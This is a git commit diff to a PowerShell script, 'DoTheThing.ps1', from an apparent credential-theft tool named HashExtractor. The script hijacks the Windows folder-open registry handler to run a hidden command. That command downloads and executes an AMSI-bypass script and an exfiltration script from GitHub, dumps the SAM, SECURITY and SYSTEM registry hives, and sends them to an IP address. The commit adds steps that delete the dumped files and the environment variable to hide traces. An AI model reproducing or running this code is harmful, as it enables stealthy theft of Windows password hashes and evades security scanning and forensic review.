c29796341ef4da94b26c1951dce8567f4bf11703
mo-tec <moritzpfefferkorn@hotmail.com>
2020-10-13 01:36:47 +0200

    Update DoTheThing.ps1

--- DoTheThing.ps1
+++ DoTheThing.ps1
@@ -1,6 +1,6 @@
 ﻿
 $ip = 'localhost'
-$Value = "powershell -windowstyle hidden `$a=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/AMSI-Bypass.ps1').Content);IEX `$a;`$b=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Invoke-Transmission.ps1').Content);IEX `$b;reg save HKLM\sam C:\Users\Public\sam;reg save HKLM\security C:\Users\Public\security;reg save HKLM\system C:\Users\Public\system;Invoke-Transmission -ip $ip"
+$Value = "powershell -windowstyle hidden `$a=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/AMSI-Bypass.ps1').Content);IEX `$a;`$b=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Invoke-Transmission.ps1').Content);IEX `$b;reg save HKLM\sam C:\Users\Public\sam;reg save HKLM\security C:\Users\Public\security;reg save HKLM\system C:\Users\Public\system;Invoke-Transmission -ip $ip;Remove-Item 'C:\Users\Public\A.bat';Remove-Item 'C:\Users\Public\sam';Remove-Item 'C:\Users\Public\security';Remove-Item 'C:\Users\Public\system';[System.Environment]::SetEnvironmentVariable('A', '',[System.EnvironmentVariableTarget]::User)"
 [System.Environment]::SetEnvironmentVariable('A', $Value,[System.EnvironmentVariableTarget]::User)
 New-Item -Path 'C:\Users\Public\A.bat' -Value '%A%'
 New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force -Value "C:\Users\Public\A.bat"
